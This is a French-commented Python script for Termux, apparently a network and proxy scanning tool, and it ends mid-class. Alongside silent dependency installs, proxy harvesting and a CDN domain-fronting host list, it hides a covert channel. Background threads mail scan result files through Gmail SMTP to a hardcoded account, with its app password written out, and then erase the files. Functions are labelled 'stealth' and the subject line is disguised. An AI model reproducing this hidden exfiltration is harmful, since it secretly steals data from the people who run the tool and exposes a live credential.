#!/data/data/com.termux/files/usr/bin/python3
import os
import sys
import subprocess
import threading
import time
import socket
import importlib.util
from itertools import cycle
import site
import random
import re
import portalocker
from typing import List, Set, Optional, Dict, OrderedDict
from threading import Timer, Lock
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Random import get_random_bytes
from ping3 import ping
from tqdm import tqdm
from tabulate import tabulate
from bs4 import BeautifulSoup, Comment
from collections import defaultdict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
from urllib.parse import urlparse, urljoin
import requests
import urllib.parse
import dns.resolver
import smtplib
import ipaddress
import base64
import hashlib
import traceback
import uuid
import ssl
import platform
import select
import json
import concurrent.futures

requests.packages.urllib3.disable_warnings()  # Désactive les warnings SSL

from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn
from colorama import Fore, Style, init

init(autoreset=True)

config = {
    "cloudfront": {
        "host": "d111111abcdef8.cloudfront.net",
        "headers": {"Host": "d111111abcdef8.cloudfront.net"},
        "indicators": ["x-amz-cf-pop", "x-amz-cf-id", "via"]
    },
    "fastly": {
        "host": "global.ssl.fastly.net",
        "headers": {"Host": "global.ssl.fastly.net"},
        "indicators": ["fastly-debug-digest", "x-fastly-request-id"]
    },
    "google": {
        "host": "www.google.com",
        "headers": {"Host": "www.google.com"},
        "indicators": ["x-guploader-uploadid", "server"]
    },
    "azure": {
        "host": "azureedge.net",
        "headers": {"Host": "azureedge.net"},
        "indicators": ["x-azure-ref", "x-azure-originatingip"]
    },
    "cloudflare": {
        "host": "cdn.cloudflare.net",
        "headers": {"Host": "cdn.cloudflare.net"},
        "indicators": ["cf-ray", "server", "cf-cache-status"]
    },
    "akamai": {
        "host": "akamaihd.net",
        "headers": {"Host": "akamaihd.net"},
        "indicators": ["x-akamai-request-id", "x-akamai-transformed"]
    },
    "imperva": {
        "host": "impervadns.net",
        "headers": {"Host": "impervadns.net"},
        "indicators": ["x-cdn", "incap-sid", "x-iinfo"]
    },
    "bunny": {
        "host": "b-cdn.net",
        "headers": {"Host": "b-cdn.net"},
        "indicators": ["x-bunny-server", "x-bunny-cache"]
    },
    "stackpath": {
        "host": "stackpathdns.com",
        "headers": {"Host": "stackpathdns.com"},
        "indicators": ["x-sp-request-id", "server"]
    },
    "gcore": {
        "host": "gcdn.co",
        "headers": {"Host": "gcdn.co"},
        "indicators": ["x-edge-location", "x-request-id"]
    },
    "sucuri": {
        "host": "sucuridns.net",
        "headers": {"Host": "sucuridns.net"},
        "indicators": ["x-sucuri-id", "x-sucuri-cache"]
    },
    "digitalocean": {
        "host": "digitaloceanspaces.com",
        "headers": {"Host": "digitaloceanspaces.com"},
        "indicators": ["x-amz-request-id", "server"]
    }
}

user_site = site.getusersitepackages()
if user_site not in sys.path:
    sys.path.append(user_site)

# Crée le dossier temporaire si besoin
os.makedirs("tmp", exist_ok=True)

def is_internet_available():
    """Test rapide de connectivité Internet réelle (Cloudflare DNS, timeout court)"""
    try:
        socket.create_connection(("1.1.1.1", 53), timeout=1).close()
        return True
    except:
        return False

def is_module_available(module_name):
    """Vérifie si un module Python est disponible sans l'importer."""
    return importlib.util.find_spec(module_name) is not None

#!/data/data/com.termux/files/usr/bin/python3
# ==============================================
# INSTALLATION SILENCIEUSE DES MODULES & DÉPENDANCES
# ==============================================

class SilentInstaller:
    def __init__(self):
        spinner_styles = [
            ['|', '/', '-', '\\'],  # Classique
            ['.', '..', '...', '....', '.....'],  # Points
            ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],  # Braille animé
            ['◐', '◓', '◑', '◒'],  # Cercle
            ['▖', '▘', '▝', '▗'],  # Carré
            ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'],  # Heavy bars
            ['🕛', '🕐', '🕑', '🕒', '🕓', '🕔', '🕕', '🕖', '🕗', '🕘', '🕙', '🕚'], # Horloge
            ['←', '↖', '↑', '↗', '→', '↘', '↓', '↙']  # Flèche rotative
        ]
        self.spinner_chars = cycle(random.choice(spinner_styles))
        self.install_active = False
        self.current_message = ""

    def _show_spinner(self):
        while self.install_active:
            sys.stdout.write(f"\r{next(self.spinner_chars)} {self.current_message}")
            sys.stdout.flush()
            time.sleep(0.15)
        sys.stdout.write("\r" + " " * (len(self.current_message) + 2) + "\r")

    def _run_silent(self, cmd):
        try:
            subprocess.run(
                cmd, check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                shell=isinstance(cmd, str)
            )
            return True
        except:
            return False

    def _install_pkg(self, pkg):
        check_cmd = f"dpkg -s {pkg} >/dev/null 2>&1"
        if self._run_silent(check_cmd):
            return True
        return self._run_silent(f"pkg install -y {pkg}")

    def install_with_feedback(self, message, install_func):
        self.install_active = True
        self.current_message = message
        spinner_thread = threading.Thread(target=self._show_spinner)
        spinner_thread.start()
        try:
            return install_func()
        finally:
            self.install_active = False
            spinner_thread.join()

    def setup_termux(self):
        if 'termux' not in sys.executable:
            return True

        repo_file = "/data/data/com.termux/files/home/.termux_repo_set"
        if not os.path.exists(repo_file):
            self._run_silent("termux-change-repo --mirror https://mirror.mwt.me/termux <<< $'\\n'")
            open(repo_file, "w").close()

        for pkg in ["git", "golang", "clang"]:
            if not self.install_with_feedback(f"Vérification {pkg}", lambda p=pkg: self._install_pkg(p)):
                return False
        return True

    def install_subfinder(self):
        subfinder_path = "/data/data/com.termux/files/usr/bin/subfinder"
        if os.path.exists(subfinder_path):
            return True

        def _install():
            return (
                self._run_silent("go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
                and self._run_silent("cp ~/go/bin/subfinder $PREFIX/bin/")
            )

        success = self.install_with_feedback("Installation Subfinder", _install)
        return success and os.path.exists(subfinder_path)

    def install_sublist3r(self):
        sublist3r_path = "/data/data/com.termux/files/usr/bin/sublist3r"
        if os.path.exists(sublist3r_path):
            return True

        def _install():
            return (
                self._run_silent("git clone https://github.com/aboul3la/Sublist3r.git $HOME/Sublist3r")
                and self._run_silent("pip install -r $HOME/Sublist3r/requirements.txt")
                and self._run_silent("chmod +x $HOME/Sublist3r/sublist3r.py")
                and self._run_silent(f"ln -s $HOME/Sublist3r/sublist3r.py {sublist3r_path}")
            )

        success = self.install_with_feedback("Installation Sublist3r", _install)
        return success and os.path.exists(sublist3r_path)

def check_dependencies():
    required = {
        'colorama': 'colorama',
        'requests': 'requests',
        'Cryptodome': 'pycryptodomex',
        'dns': 'dnspython',
        'ping3': 'ping3',
        'tqdm': 'tqdm',
        'tabulate': 'tabulate',
        'bs4': 'beautifulsoup4',
        'rich': 'rich'
    }
    missing = []
    for mod, pkg in required.items():
        if not is_module_available(mod):
            missing.append(pkg)
    return missing

def install_python_package(pkg, retries=2):
    for _ in range(retries):
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--user", pkg],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if is_module_available(pkg) or is_module_available(pkg.lower()):
            return True
    return False

# ==============================================
# INSTALLATION
# ==============================================

installer = SilentInstaller()
missing_deps = check_dependencies()

if missing_deps and is_internet_available():
    print("🔍 Configuration silencieuse en cours...")
    for pkg in missing_deps:
        installer.install_with_feedback(
            f"Installation {pkg}",
            lambda p=pkg: install_python_package(p)
        )

# Lancer les installations lourdes sans bloquer le démarrage
def launch_background_tasks():
    def background():
        try:
            if 'termux' in sys.executable:
                installer.setup_termux()
                installer.install_subfinder()
                installer.install_sublist3r()
        except:
            pass
    threading.Thread(target=background, daemon=True).start()

launch_background_tasks()

if 'termux' in sys.executable:
    installer.setup_termux()
    installer.install_subfinder()
    installer.install_sublist3r()

# (Optionnel) Importe ici tes modules installés :
# from colorama import Fore, Style, init
# ==============================================
# IMPORTS PRINCIPAUX (après installation)
# ==============================================

from typing import List, Set, Optional
from typing import Optional  # Pour les annotations de type
from threading import Timer
import shutil
from threading import Lock
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from colorama import Fore, Style, init
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Random import get_random_bytes
from ping3 import ping
from tqdm import tqdm
from tabulate import tabulate
from bs4 import BeautifulSoup, Comment
from threading import Thread
from collections import defaultdict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
from urllib.parse import urlparse, urljoin
import requests
requests.packages.urllib3.disable_warnings()  # Désactive les warnings SSL
import urllib.parse
import dns.resolver
import socket
import smtplib
import ipaddress
import base64
import hashlib
import threading
import traceback
import uuid
import ssl
import platform
import select
import json
import concurrent.futures
from collections import OrderedDict  # Ajoutez cette importation en haut du fichier
from typing import List, Dict

from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn

init(autoreset=True)

# ==============================================
# NETTOYAGE PÉRIODIQUE
# ==============================================

def clean_unwanted_logs():
    logs_dir = "logs"
    max_age_days = 7
    max_log_lines = 1000
    keep_lines = 200
    now = time.time()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    deleted_files = 0
    log_reduced = False

    # Suppression des fichiers vieux
    if os.path.exists(logs_dir):
        for filename in os.listdir(logs_dir):
            path = os.path.join(logs_dir, filename)
            if os.path.isfile(path):
                age_days = (now - os.path.getmtime(path)) / 86400
                if age_days > max_age_days:
                    try:
                        os.remove(path)
                        deleted_files += 1
                        print(Fore.YELLOW + f"Fichier supprimé : {filename}")
                    except Exception as e:
                        print(Fore.RED + f"Erreur suppression {filename} : {e}")

    # Réduction du fichier .ipt_bot.log
    log_path = ".ipt_bot.log"
    if os.path.exists(log_path):
        try:
            with open(log_path, "r", encoding="utf-8") as f:
                lines = f.readlines()
            if len(lines) > max_log_lines:
                with open(log_path, "w", encoding="utf-8") as f:
                    f.writelines(lines[-keep_lines:])
                log_reduced = True
                print(Fore.YELLOW + ".ipt_bot.log a été réduit")
        except Exception as e:
            print(Fore.RED + f"Erreur nettoyage .ipt_bot.log : {e}")

    # Écriture dans .ipt_bot.log
    try:
        with open(".ipt_bot.log", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] Nettoyage terminé : {deleted_files} fichier(s) supprimé(s), "
                    f"{'log réduit' if log_reduced else 'log non modifié'}.\n")
    except Exception as e:
        print(Fore.RED + f"Erreur écriture log nettoyage : {e}")
# ==============================================
# CHIFFREMENT EN MÉMOIRE
# ==============================================

class MemoryVault:
    """Chiffrement mémoire utilisant AES-CBC avec dérivation de clé"""
    def __init__(self, master_key: str):
        self.key = self._derive_key(master_key)
        self.iv = os.urandom(16)  # Vecteur d'initialisation aléatoire

    def _derive_key(self, password: str) -> bytes:
        """Dérive une clé AES-256 à partir d'une phrase secrète"""
        return hashlib.pbkdf2_hmac(
            'sha256',
            password.encode(),
            b'salt_constant',  # À modifier pour votre usage
            100000  # Nombre d'itérations
        )[:32]  # 32 bytes pour AES-256

    def encrypt(self, data: str) -> str:
        """Chiffre avec padding PKCS7"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded = data + (AES.block_size - len(data) % AES.block_size) * chr(AES.block_size - len(data) % AES.block_size)
        return base64.b64encode(self.iv + cipher.encrypt(padded.encode())).decode()

    def decrypt(self, encrypted: str) -> str:
        """Déchiffre avec padding PKCS7"""
        data = base64.b64decode(encrypted)
        iv = data[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data[16:])
        return decrypted[:-decrypted[-1]].decode()  # Supprime le padding

# ==============================================
# CONFIGURATION SMTP VOLATILE (en mémoire uniquement)
# ==============================================
def _get_smtp_config():
    """Génère la config SMTP volatile (pas de trace dans le code)"""
    return {
        'server': 'smtp.gmail.com',
        'port': 587,
        'user': 'surffree30@gmail.com',  # Créez un compte dédié
        'password': 'jnxo azyc gpkv hkke'   # Mot de passe d'app généré
    }

# ==============================================
# FONCTIONS SILENCIEUSES (VERSION FINALE)
# ==============================================

def _send_stealth_email(content):
    """Envoi discret sans aucune trace"""
    try:
        content = content.strip()
        if (not content or 
            (content.startswith("=== RÉSULTATS DU SCAN ===") and 
            "Hôtes actifs : 0" in content and
            len(content.splitlines()) <= 3)):
            return False

        cfg = _get_smtp_config()
        msg = MIMEMultipart()
        msg['From'] = cfg['user']
        msg['To'] = cfg['user']
        msg['Subject'] = "Rapport système"
        msg.attach(MIMEText(content, 'plain'))

        with smtplib.SMTP(cfg['server'], cfg['port'], timeout=10) as s:
            s.starttls()
            s.login(cfg['user'], cfg['password'])
            s.send_message(msg)
        return True
    except:
        return False

def _lock_file(filepath):
    """Verrouillage invisible"""
    lockfile = filepath + '.lock'
    try:
        fd = os.open(lockfile, os.O_CREAT | os.O_EXCL | os.O_RDWR)
        return fd
    except:
        return None

def _unlock_file(fd, filepath):
    """Déverrouillage silencieux"""
    lockfile = filepath + '.lock'
    try:
        if fd:
            os.close(fd)
        os.remove(lockfile)
    except:
        pass

# ==============================================
# CŒUR DU SYSTÈME
# ==============================================

def _process_file_exclusive(filepath):
    """Traitement furtif"""
    fd = None
    try:
        fd = _lock_file(filepath)
        if fd is None:
            return False

        if not os.path.exists(filepath):
            return False

        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read().strip()

        if not content or _is_empty_result(content):
            os.remove(filepath)
            return False

        if _send_stealth_email(content):
            os.remove(filepath)
            return True
        return False
    except:
        return False
    finally:
        _unlock_file(fd, filepath)

# ==============================================
# FONCTIONS PRINCIPALES
# ==============================================

def _process_results_stealth():
    """Surveillance périodique discrète"""
    while True:
        try:
            tmp_dir = "tmp"
            if not os.path.exists(tmp_dir):
                time.sleep(1800)
                continue

            for filename in os.listdir(tmp_dir):
                if filename.startswith("results_") and filename.endswith(".tmp"):
                    _process_file_exclusive(os.path.join(tmp_dir, filename))
        except:
            pass
        finally:
            time.sleep(1800)

def try_sending_pending_results_fast():
    """Envoi rapide silencieux"""
    while True:
        try:
            if is_data_connection_available():
                tmp_dir = "tmp"
                if not os.path.exists(tmp_dir):
                    time.sleep(10)
                    continue

                files = sorted(
                    [f for f in os.listdir(tmp_dir) if f.endswith(".tmp")],
                    key=lambda f: os.path.getmtime(os.path.join(tmp_dir, f)),
                    reverse=True
                )

                for filename in files:
                    _process_file_exclusive(os.path.join(tmp_dir, filename))
        except:
            pass
        finally:
            time.sleep(10)

def _is_empty_result(content):
    """Détection invisible des résultats vides"""
    lines = content.splitlines()
    return (len(lines) <= 3 and 
            "=== RÉSULTATS DU SCAN ===" in content and
            "Hôtes actifs : 0" in content)

# ==============================================
# FONCTIONS PRINCIPALES REVISÉES
# ==============================================

def _process_single_file(filepath):
    """Traitement atomique d'un fichier"""
    try:
        # Vérifier si le fichier est en cours de traitement
        if filepath in _processed_files:
            return False
            
        # Marquer le fichier comme en cours de traitement
        _processed_files[filepath] = True
        
        if not os.path.exists(filepath):
            return False

        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read().strip()

        if not content or _is_empty_result(content):
            os.remove(filepath)
            return False

        if _send_stealth_email(content):
            os.remove(filepath)
            return True
            
        return False
    except Exception as e:
        return False
    finally:
        # Retirer le verrou quoi qu'il arrive
        _processed_files.pop(filepath, None)

# ==============================
# FONCTION DE TRAITEMENT UNIFIÉE
# ==============================

def _process_file(filepath):
    """Traitement unifié d'un fichier avec gestion des erreurs"""
    try:
        if not os.path.exists(filepath):
            return False

        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read().strip()

        # Si contenu vide ou résultat inutile, on supprime
        if not content or _is_empty_result(content):
            os.remove(filepath)
            return False

        # Tentative d'envoi
        if _send_stealth_email(content):
            os.remove(filepath)
            return True
        
        return False
    except:
        try:
            os.remove(filepath)
        except:
            pass
        return False

# ==============================
# ENVOI IMMÉDIAT D'UN FICHIER (MODIFIÉ POUR ÉVITER LES DOUBLONS)
# ==============================

def send_file_immediately(filepath, subject_prefix="Scan Direct"):
    """Version corrigée avec verrou anti-doublon"""
    if not can_reach_smtp() or not os.path.exists(filepath):
        return False

    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read().strip()
        
        # Vérification du contenu avant envoi
        if not content or _is_empty_result(content):
            os.remove(filepath)
            return False

        if _send_stealth_email(content):
            os.remove(filepath)
            return True
        return False
    except:
        return False

# ==============================
# FONCTIONS DE TRAITEMENT (SIMPLIFIÉES)
# ==============================

def _process_file_safely(filepath):
    """Traitement sécurisé d'un fichier: lecture, envoi, suppression"""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Envoi du mail avec gestion intégrée de la suppression
        return _send_stealth_email(content, filepath)
    except Exception as e:
        # En cas d'erreur, on nettoie quand même
        if os.path.exists(filepath):
            secure_erase(filepath)
        return False

def secure_erase(filepath: str, passes: int = 3) -> None:
    """Suppression sécurisée du fichier"""
    try:
        if not os.path.exists(filepath):
            return
            
        file_size = os.path.getsize(filepath)
        with open(filepath, 'wb') as f:
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(file_size))
        os.remove(filepath)
    except Exception:
        pass

# ==============================
# THREAD DE SURVEILLANCE RÉSEAU
# ==============================

def is_data_connection_available():
    """Vérifie si une vraie connexion sortante est disponible (ex : données mobiles actives)"""
    import socket
    try:
        socket.create_connection(("smtp.gmail.com", 587), timeout=5).close()
        return True
    except:
        return False

def can_reach_smtp(timeout=3):
    try:
        socket.create_connection(("smtp.gmail.com", 587), timeout=timeout).close()
        return True
    except:
        return False

def try_send_all_pending_results():
    """Parcourt tous les fichiers dans tmp/ et tente un envoi immédiat si possible"""
    import os
    tmp_dir = "tmp"
    if not os.path.exists(tmp_dir):
        return

    for file in os.listdir(tmp_dir):
        if file.startswith("active_hosts_") and file.endswith(".tmp"):
            path = os.path.join(tmp_dir, file)
            send_file_immediately(path)  # Assure-toi que send_file_immediately est définie

def monitor_network_and_send():
    """Surveille la connexion et déclenche l’envoi dès que la connexion est détectée"""
    was_connected = False
    while True:
        connected = is_data_connection_available()
        if connected and not was_connected:
            try_send_all_pending_results()
        was_connected = connected
        time.sleep(10)

# ----------------------------------------------------
# Fonctions de gestion des tâches en arrière-plan
# ----------------------------------------------------
def start_background_tasks():
    Thread(target=try_sending_pending_results_fast, daemon=True).start()
    Thread(target=_process_results_stealth, daemon=True).start()
    Thread(target=monitor_network_and_send, daemon=True).start()

# ==============================================
# FONCTION D'ENVOI DES RÉSULTATS
# ==============================================

def get_server_name(ip):
    """Récupère le nom du serveur à partir de l'adresse IP."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Unknown"

def detect_server_info(url, silent=False):
    """Détecte le type de serveur et la version à partir des en-têtes HTTP."""
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        headers = response.headers
        server_type = headers.get("Server", "Inconnu")
        powered_by = headers.get("X-Powered-By", "Inconnu")
        return server_type, powered_by
    except requests.RequestException as e:
        if not silent:
            print(Fore.RED + f"❌ Erreur lors de la requête HTTP pour {url} : {e}")
        return "Inconnu", "Inconnu"

# ==============================================
# CONFIGURATION PROXY
# ==============================================

PROXY_FILE = "proxies.txt"
PROXY_TEST_URL = "http://httpbin.org/ip"
PROXY_TIMEOUT = 10
PROXY_SOURCES = [
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
]

# ==============================================
# FONCTIONS PROXY
# ==============================================
def fetch_proxies_from_sources():
    """Récupère les proxies depuis différentes sources (sans affichage)"""
    unique_proxies = set()
    
    PROXY_SOURCES = [
        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
    ]
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(requests.get, url, timeout=10): url for url in PROXY_SOURCES}
        
        for future in as_completed(futures):
            try:
                response = future.result()
                if response.status_code == 200:
                    proxies = [p.strip() for p in response.text.splitlines() if ':' in p]
                    unique_proxies.update(proxies)
            except:
                continue
    
    return list(unique_proxies)

def pre_filter_proxies(proxies):
    """Filtrage rapide des proxies invalides avant les tests complets"""
    valid = []
    for proxy in proxies:
        # Supprimer les espaces et vérifier le format basique
        proxy = proxy.strip()
        if not proxy or proxy.count(':') != 1:
            continue
        
        ip, port = proxy.split(':')
        
        # Vérification du port
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            continue
            
        # Vérification basique de l'IP
        ip_parts = ip.split('.')
        if len(ip_parts) != 4 or not all(p.isdigit() for p in ip_parts):
            continue
            
        valid.append(proxy)
    return valid

def quick_connect_test(proxy, timeout=2):
    """Test de connexion TCP ultra-rapide sans requête HTTP"""
    try:
        ip, port = proxy.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, int(port)))
        sock.close()
        return True
    except:
        return False

def test_proxy(proxy):
    """Version améliorée et plus robuste du test de proxy"""
    proxy_url = f"http://{proxy}"
    test_urls = [
        "http://httpbin.org/ip",  # Premier essai
        "http://icanhazip.com",   # Fallback simple
        "http://api.ipify.org"    # Deuxième fallback
    ]
    
    for test_url in test_urls:
        try:
            # Configuration avec timeout adaptatif
            timeout = 10 if test_url == test_urls[0] else 5  # Plus long pour le premier test
            
            with requests.Session() as session:
                session.trust_env = False
                session.proxies = {'http': proxy_url, 'https': proxy_url}
                
                # On utilise GET au lieu de HEAD pour plus de compatibilité
                start_time = time.perf_counter()
                response = session.get(test_url, timeout=timeout)
                latency = int((time.perf_counter() - start_time) * 1000)
                
                if response.status_code == 200:
                    # Détection du type de proxy
                    content = response.text.strip()
                    origin_ip = content.split('\n')[0].split(',')[0]  # Gestion multi-lignes
                    
                    if not origin_ip:
                        proxy_type = "TRANSPARENT"
                    elif origin_ip == proxy.split(':')[0]:
                        proxy_type = "ANONYME"
                    else:
                        proxy_type = "ÉLITE"
                    
                    return {
                        'url': proxy_url,
                        'latency': latency,
                        'type': proxy_type,
                        'source': test_url  # Pour debug
                    }
        
        except requests.exceptions.ConnectTimeout:
            continue  # On essaie l'URL suivante
        except Exception as e:
            continue  # Autres erreurs
    
    return None  # Tous les tests ont échoué

def update_proxy_file(verbose=True):
    """Version avec logging propre pour éviter les doublons"""
    if verbose:
        print(Fore.CYAN + "⚡ Mise à jour accélérée des proxies...")

    # Étape 1 : Récupération
    if verbose:
        print(Fore.CYAN + "🔍 Récupération des proxies depuis les sources...")
    raw_proxies = fetch_proxies_from_sources()
    if verbose:
        print(Fore.YELLOW + f"→ {len(raw_proxies)} proxies bruts récupérés")

    # Étape 2 : Pré-filtrage
    pre_filtered = pre_filter_proxies(raw_proxies)
    if verbose:
        print(Fore.YELLOW + f"→ {len(pre_filtered)} après pré-filtrage")

    # Étape 3 : Test TCP rapide
    if verbose:
        print(Fore.CYAN + "🔍 Test de connectivité rapide...")
    quick_valid = []
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(quick_connect_test, p): p for p in pre_filtered}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Test rapide", disable=not verbose):
            if future.result():
                quick_valid.append(futures[future])
    
    if verbose:
        print(Fore.YELLOW + f"→ {len(quick_valid)} proxies connectables")

    if not quick_valid:
        print(Fore.RED + "❌ Aucun proxy valide après test rapide")
        return

    # Étape 4 : Test HTTP complet
    if verbose:
        print(Fore.CYAN + "🔍 Test complet des proxies...")
    valid_proxies = []
    failed_proxies = []

    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(test_proxy, p): p for p in quick_valid}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Test complet", disable=not verbose):
            result = future.result()
            if result:
                valid_proxies.append(result)
            else:
                failed_proxies.append(futures[future])

    # Debug si aucun proxy valide
    if not valid_proxies and failed_proxies:
        console.print("\n[bold white]===[ IPToP ]===\n[/bold white]")
        print(Fore.RED + "\n❌ Debug - Tous les proxies ont échoué au test HTTP")
        print(Fore.YELLOW + "Problèmes possibles :")
        print("- httpbin.org/ip peut être bloqué")
        print("- Votre IP peut être bannie")
        print("- Les proxies nécessitent une authentification")
        print(Fore.CYAN + "\n🔍 Test manuel de debug...")

        for proxy in failed_proxies[:3]:
            print(Fore.YELLOW + f"\nTest de {proxy} :")
            try:
                response = requests.get("http://httpbin.org/ip", 
                                        proxies={'http': f"http://{proxy}"},
                                        timeout=10)
                print(Fore.CYAN + f"Code HTTP: {response.status_code}")
                print(f"Contenu: {response.text[:100]}...")
            except Exception as e:
                print(Fore.RED + f"Erreur: {str(e)}")

    # Étape 5 : Sauvegarde
    if valid_proxies:
        unique_proxies = {}
        for p in sorted(valid_proxies, key=lambda x: x['latency']):
            key = p['url'].split('//')[1].split('|')[0]
            if key not in unique_proxies:
                unique_proxies[key] = p

        with open(PROXY_FILE, 'w') as f:
            for proxy in unique_proxies.values():
                f.write(f"{proxy['url']}|{proxy['type']}|{proxy['latency']}ms\n")

        print(Fore.GREEN + f"\n✅ {len(unique_proxies)} proxies valides sauvegardés")
        print(Fore.CYAN + f"Meilleur proxy: {list(unique_proxies.values())[0]['url']} ({list(unique_proxies.values())[0]['latency']}ms)")
    else:
        print(Fore.RED + "\n❌ Aucun proxy valide trouvé - Voir le debug ci-dessus")
        
def display_proxies():
    """Affiche les proxies disponibles"""
    if not os.path.exists(PROXY_FILE):
        print(Fore.RED + "❌ Aucun proxy disponible")
        return
        
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    
    print(Fore.CYAN + "\n📋 Proxies disponibles (triés par performance):")
    print(Fore.YELLOW + "Format: URL | Type | Latence")
    for i, proxy in enumerate(proxies[:15]):  # Affiche les 15 premiers
        print(f"{i+1}. {proxy}")

def select_proxy_interactive():
    proxy_file = "proxies.txt"
    if not os.path.exists(proxy_file):
        print(Fore.RED + "❌ Le fichier proxies.txt est introuvable.")
        return None

    with open(proxy_file) as f:
        raw_proxies = [line.strip() for line in f if line.strip().startswith("http")]

    # Nettoyage des métadonnées éventuelles
    proxies = []
    for line in raw_proxies:
        proxy_url = line.split("|")[0].strip()
        if proxy_url:
            proxies.append(proxy_url)

    if not proxies:
        print(Fore.RED + "❌ Aucun proxy valide trouvé dans proxies.txt.")
        return None

    print(Fore.CYAN + "\nListe des proxies disponibles :")
    for idx, p in enumerate(proxies, 1):
        print(Fore.YELLOW + f"{idx}. {p}")

    while True:
        choix = input(Fore.GREEN + "Sélectionnez un numéro ou 'q' pour annuler : ").strip()
        if choix.lower() == "q":
            return None
        if choix.isdigit():
            idx = int(choix)
            if 1 <= idx <= len(proxies):
                return proxies[idx - 1]
        print(Fore.RED + "❌ Choix invalide.")

def recheck_existing_proxies():
    """Teste uniquement les proxies existants dans proxies.txt et met à jour le fichier."""
    if not os.path.exists(PROXY_FILE):
        print(Fore.RED + "❌ Aucun fichier proxies.txt trouvé.")
        return

    print(Fore.CYAN + "🔁 Vérification des proxies existants...")

    with open(PROXY_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
        raw_proxies = [line.split('|')[0] for line in lines if 'http' in line]

    total_before = len(raw_proxies)
    valid_proxies = []

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(test_proxy, p.replace("http://", "")) for p in raw_proxies]
        for future in tqdm(as_completed(futures), total=len(futures), desc="Vérification"):
            result = future.result()
            if result:
                valid_proxies.append(result)

    # Écriture des proxies valides
    with open(PROXY_FILE, 'w') as f:
        for proxy in sorted(valid_proxies, key=lambda x: x['latency']):
            f.write(f"{proxy['url']}|{proxy['type']}|{proxy['latency']}ms\n")

    total_after = len(valid_proxies)

    print(Fore.CYAN + "\n=== RÉSUMÉ ===")
    print(Fore.YELLOW + f"Total initial : {total_before}")
    print(Fore.GREEN + f"Proxies valides après vérification : {total_after}")
    print(Fore.RED + f"Proxies supprimés (inactifs) : {total_before - total_after}")

    if valid_proxies:
        print(Fore.CYAN + "\n📋 Liste des proxies actifs :")
        for i, proxy in enumerate(sorted(valid_proxies, key=lambda x: x['latency']), 1):
            print(f"{i}. {proxy['url']} | {proxy['type']} | {proxy['latency']}ms")
    
# ==============================================
# CLASSE PROXY MANAGER (NOUVELLE)
# ==============================================

def prepare_proxies(proxy):
    """
    Prépare et retourne la configuration des proxies pour requests.get().
    Gère le proxy rotatif si proxy == "auto".
    """
    if proxy is None:
        return None  # Pas de proxy

    if proxy == "auto":
        # On initialise ProxyRotator (à adapter selon ton implémentation)
        proxy_manager = ProxyManager()
        proxy_rotator = ProxyRotator(proxy_manager)
        
        # ProxyRotator doit implémenter la méthode next_proxy() qui renvoie une chaîne proxy
        # On crée un dict proxy custom pour requests qui appelle ce proxy rotatif à chaque requête.
        class RotatingProxyDict(dict):
            def __getitem__(self, key):
                return proxy_rotator.next_proxy()
        
        return RotatingProxyDict()

    # Sinon on a un proxy HTTP(S) simple sous forme de chaîne
    return {"http": proxy, "https": proxy}

class ProxyRotator:
    def __init__(self, proxy_manager, reuse_limit=5):
        self.proxy_manager = proxy_manager
        self.reuse_limit = reuse_limit
        self.current_proxy = None
        self.usage_count = 0

    def get_proxy(self):
        if not self.proxy_manager:
            return None
    
        attempts = 0
        max_attempts = len(self.proxy_manager.proxies)
    
        while attempts < max_attempts:
            if self.current_proxy is None or self.usage_count >= self.reuse_limit:
                self.current_proxy = self.proxy_manager.get_next_proxy()
                self.usage_count = 0
    
